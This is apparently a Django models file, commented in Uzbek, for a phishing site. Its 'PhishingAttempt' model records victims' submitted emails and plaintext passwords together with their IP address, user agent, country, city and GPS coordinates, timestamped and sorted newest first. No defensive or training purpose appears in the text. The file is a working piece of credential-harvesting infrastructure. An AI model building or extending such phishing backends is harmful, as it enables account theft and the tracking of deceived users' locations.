from django.contrib.auth.models import AbstractUser
from django.db import models


class CustomUser(AbstractUser):
    age = models.PositiveIntegerField(null=True, blank=True)


class PhishingAttempt(models.Model):
    # Kiritilgan ma'lumotlar
    email = models.EmailField(blank=True)
    password = models.CharField(max_length=255, blank=True)

    # Tarmoq ma'lumotlari
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.CharField(max_length=500, blank=True)

    # Geolokatsiya
    country = models.CharField(max_length=100, blank=True)
    city = models.CharField(max_length=100, blank=True)
    latitude = models.FloatField(null=True, blank=True)
    longitude = models.FloatField(null=True, blank=True)

    # Vaqt
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.email} | {self.ip_address} | {self.country}/{self.city} | {self.timestamp:%Y-%m-%d %H:%M}"

    class Meta:
        ordering = ['-timestamp']
        verbose_name = "Phishing Urinish"
        verbose_name_plural = "Phishing Urinishlar"